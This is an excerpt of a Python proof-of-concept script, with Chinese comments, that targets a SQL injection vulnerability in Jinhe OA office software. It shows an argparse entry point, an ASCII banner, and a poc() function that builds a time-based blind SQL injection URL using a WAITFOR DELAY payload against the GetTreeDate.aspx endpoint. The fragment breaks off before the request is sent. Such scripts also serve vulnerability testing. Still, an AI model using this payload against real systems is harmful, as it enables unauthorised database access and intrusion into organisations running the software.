...
def main():
    '''主函数'''
    banner()            
    parser = argparse.ArgumentParser(description = '金和OA SQL注入漏洞')    #实例化对象
...
$$ |  $$ |$$ |  $$ |      $$\   $$ |$$ $$\$$ |$$ |      
 $$$$$$  |$$ |  $$ |      \$$$$$$  |\$$$$$$ / $$$$$$$$\ 
 \______/ \__|  \__|       \______/  \___$$$\ \________|
                                         \___|          
...
def poc(target):
    '''检测漏洞'''
    url = target + '/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1;WAITFOR+DELAY+%270:0:5%27+--%20and%201=1'
    headers = {
